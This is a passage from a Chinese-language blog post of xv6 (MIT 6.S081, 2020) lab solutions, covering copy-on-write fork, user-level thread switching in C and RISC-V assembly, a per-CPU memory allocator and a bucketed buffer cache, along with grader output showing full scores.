class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="keyword">char</span> *mem=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout b\n&quot;);</span></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(va0&lt;MAXVA)&#123;</span><br><span class="line">      pte=walk(pagetable,va0,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>(pte ==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      flags=PTE_FLAGS(*pte);</span><br><span class="line">      <span class="keyword">if</span>((flags&amp;PTE_COW)!=<span class="number">0</span>&amp;&amp;((mem=kalloc())!=<span class="number">0</span>))&#123;</span><br><span class="line">        uint64 pa=PTE2PA(*pte);</span><br><span class="line">        memmove(mem,(<span class="keyword">void</span> *)pa,PGSIZE);</span><br><span class="line">        flags=(flags&amp;(~PTE_COW))|PTE_W;</span><br><span class="line">        *pte=PA2PTE(mem)|flags;</span><br><span class="line">        kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">        pa0=(uint64)mem;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;copyout e\n&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="comment">// uint64 num;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    cow_num[(pa&gt;&gt;<span class="number">12</span>)]++;</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="keyword">if</span>(flags&amp;PTE_W)&#123;</span><br><span class="line">      *pte=(*pte)|PTE_COW;</span><br><span class="line">      *pte=(*pte)&amp;(~PTE_W);</span><br><span class="line">      flags=flags|PTE_COW;</span><br><span class="line">      flags=(flags&amp;(~PTE_W));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// flags = (PTE_FLAGS(*pte)&amp;(~PTE_W))|PTE_COW;</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>, i, PGSIZE, (uint64)pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  err:</span></span><br><span class="line"><span class="comment">//   uvmunmap(new, 0, i / PGSIZE, 1);</span></span><br><span class="line"><span class="comment">//   return -1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><p>满分，好欸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/xxv6/xv6-labs-2020$ ./grade-lab-cow </span><br><span class="line">make: “kernel/kernel”已是最新。</span><br><span class="line">== Test running cowtest == (4.9s) </span><br><span class="line">== Test   simple == </span><br><span class="line">  simple: OK </span><br><span class="line">== Test   three == </span><br><span class="line">  three: OK </span><br><span class="line">== Test   file == </span><br><span class="line">  file: OK </span><br><span class="line">== Test usertests == (107.3s) </span><br><span class="line">    (Old xv6.out.usertests failure <span class="built_in">log</span> removed)</span><br><span class="line">== Test   usertests: copyin == </span><br><span class="line">  usertests: copyin: OK </span><br><span class="line">== Test   usertests: copyout == </span><br><span class="line">  usertests: copyout: OK </span><br><span class="line">== Test   usertests: all tests == </span><br><span class="line">  usertests: all tests: OK </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 110/110</span><br></pre></td></tr></table></figure>

<h2 id="Lab7-Multithreading"><a href="#Lab7-Multithreading" class="headerlink" title="Lab7: Multithreading"></a>Lab7: Multithreading</h2><h3 id="Uthread-switching-between-threads-moderate"><a href="#Uthread-switching-between-threads-moderate" class="headerlink" title="Uthread: switching between threads (moderate)"></a>Uthread: switching between threads (moderate)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">thread_create</span><span class="params">(<span class="keyword">void</span> (*func)())</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;state == FREE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  t-&gt;state = RUNNABLE;</span><br><span class="line">  t-&gt;context.sp=(uint64)t-&gt;<span class="built_in">stack</span>+STACK_SIZE<span class="number">-1</span>;</span><br><span class="line">  t-&gt;context.ra=(uint64)func;</span><br><span class="line">  <span class="comment">// YOUR CODE HEREs</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (current_thread != next_thread) &#123;         <span class="comment">/* switch threads?  */</span></span><br><span class="line">    next_thread-&gt;state = RUNNING;</span><br><span class="line">    t = current_thread;</span><br><span class="line">    current_thread = next_thread;</span><br><span class="line">    <span class="comment">/* YOUR CODE HERE</span></span><br><span class="line"><span class="comment">     * Invoke thread_switch to switch from t to next_thread:</span></span><br><span class="line"><span class="comment">     * thread_switch(??, ??);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    thread_switch((uint64)&amp;(t-&gt;context),(uint64)&amp;(current_thread-&gt;context));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span>       <span class="built_in">stack</span>[STACK_SIZE]; <span class="comment">/* the thread&#x27;s stack */</span></span><br><span class="line">  <span class="keyword">int</span>        state;             <span class="comment">/* FREE, RUNNING, RUNNABLE */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.globl thread_switch</span><br><span class="line">thread_switch:</span><br><span class="line">	sd ra, 0(a0)</span><br><span class="line">	sd sp, 8(a0)</span><br><span class="line">	sd s0, 16(a0)</span><br><span class="line">	sd s1, 24(a0)</span><br><span class="line">	sd s2, 32(a0)</span><br><span class="line">	sd s3, 40(a0)</span><br><span class="line">	sd s4, 48(a0)</span><br><span class="line">	sd s5, 56(a0)</span><br><span class="line">	sd s6, 64(a0)</span><br><span class="line">	sd s7, 72(a0)</span><br><span class="line">	sd s8, 80(a0)</span><br><span class="line">	sd s9, 88(a0)</span><br><span class="line">	sd s10, 96(a0)</span><br><span class="line">	sd s11, 104(a0)</span><br><span class="line"></span><br><span class="line">	ld ra, 0(a1)</span><br><span class="line">	ld sp, 8(a1)</span><br><span class="line">	ld s0, 16(a1)</span><br><span class="line">	ld s1, 24(a1)</span><br><span class="line">	ld s2, 32(a1)</span><br><span class="line">	ld s3, 40(a1)</span><br><span class="line">	ld s4, 48(a1)</span><br><span class="line">	ld s5, 56(a1)</span><br><span class="line">	ld s6, 64(a1)</span><br><span class="line">	ld s7, 72(a1)</span><br><span class="line">	ld s8, 80(a1)</span><br><span class="line">	ld s9, 88(a1)</span><br><span class="line">	ld s10, 96(a1)</span><br><span class="line">	ld s11, 104(a1)</span><br><span class="line">	ret    /* return to ra */</span><br></pre></td></tr></table></figure>

<p>后面两个实验就是用户态的锁和释放，就不放代码了</p>
<h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">make: “kernel/kernel”已是最新。</span><br><span class="line">== Test uthread == uthread: OK (0.9s) </span><br><span class="line">== Test answers-thread.txt == answers-thread.txt: OK </span><br><span class="line">== Test ph_safe == make: “ph”已是最新。</span><br><span class="line">ph_safe: OK (10.8s) </span><br><span class="line">== Test ph_fast == make: “ph”已是最新。</span><br><span class="line">ph_fast: OK (22.3s) </span><br><span class="line">== Test barrier == make: “barrier”已是最新。</span><br><span class="line">barrier: OK (11.1s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 60/60</span><br></pre></td></tr></table></figure>

<h2 id="Lab8-locks"><a href="#Lab8-locks" class="headerlink" title="Lab8: locks"></a>Lab8: locks</h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><p>为每个cpu准备一个空闲队列，然后每个cpu在自己的空闲队列上获得新页面，然后为每个空闲队列准备一个锁</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;memlayout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> end[]; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem[<span class="number">0</span>].lock, <span class="string">&quot;kmem0&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">1</span>].lock, <span class="string">&quot;kmem1&quot;</span>);</span><br><span class="line">  initlock(&amp;kmem[<span class="number">2</span>].lock, <span class="string">&quot;kmem2&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa : %p\n&quot;</span>,(uint64)pa);</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  r = (struct run*)pa;</span><br><span class="line">  keme_id=(((uint64)pa)&gt;&gt;<span class="number">12</span>)%<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r-&gt;next = kmem[keme_id].freelist;</span><br><span class="line">  kmem[keme_id].freelist = r;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_other_freeelist_r</span><span class="params">(uint32 kmem_id)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  acquire(&amp;kmem[kmem_id].lock);</span><br><span class="line">  r = kmem[kmem_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[kmem_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[kmem_id].lock);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint32 keme_id;</span><br><span class="line">  keme_id=cpuid();</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem[keme_id].lock);</span><br><span class="line">  r = kmem[keme_id].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem[keme_id].freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem[keme_id].lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">    r=get_other_freeelist_r((keme_id+<span class="number">1</span>)%<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(!r)&#123;</span><br><span class="line">      r=get_other_freeelist_r((keme_id+<span class="number">2</span>)%<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><p>在xv6操作系统中，会有一个缓冲区列表来记录磁盘内容，当读磁盘的时候，首先会把内容缓冲到这个缓冲区，然后再从这个缓冲区中读取信息，刚开始这个缓冲区全部放在一个链表中然后使用一个锁防止竞争，但是io吞吐量比较大的时候是比较浪费cpu资源的，所以得让数据结构更加细化，选择使用一个桶（但感觉和哈希表没啥差别）来整多个链表，然后每个链表一个锁来保护，这样既能防止竞争，又能更加线程化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Bucket_size 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH(id) (id%13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;spinlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;sleeplock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;riscv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;buf.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">bucket</span>&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bucket</span> <span class="title">buckets</span>[13];</span></span><br><span class="line">  </span><br><span class="line">&#125; bcache;</span><br><span class="line"><span class="keyword">char</span> lockname[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> b_lockname[<span class="number">30</span>][<span class="number">16</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">b</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(lockname));</span><br><span class="line">  <span class="built_in">memset</span>(b_lockname,<span class="number">0</span>,<span class="keyword">sizeof</span>(b_lockname));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(lockname[i],<span class="keyword">sizeof</span>(lockname),<span class="string">&quot;bcahce_%d&quot;</span>,i);</span><br><span class="line">    initlock(&amp;(bcache.buckets[i].lock),lockname[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Bucket_size;i++)&#123;</span><br><span class="line">    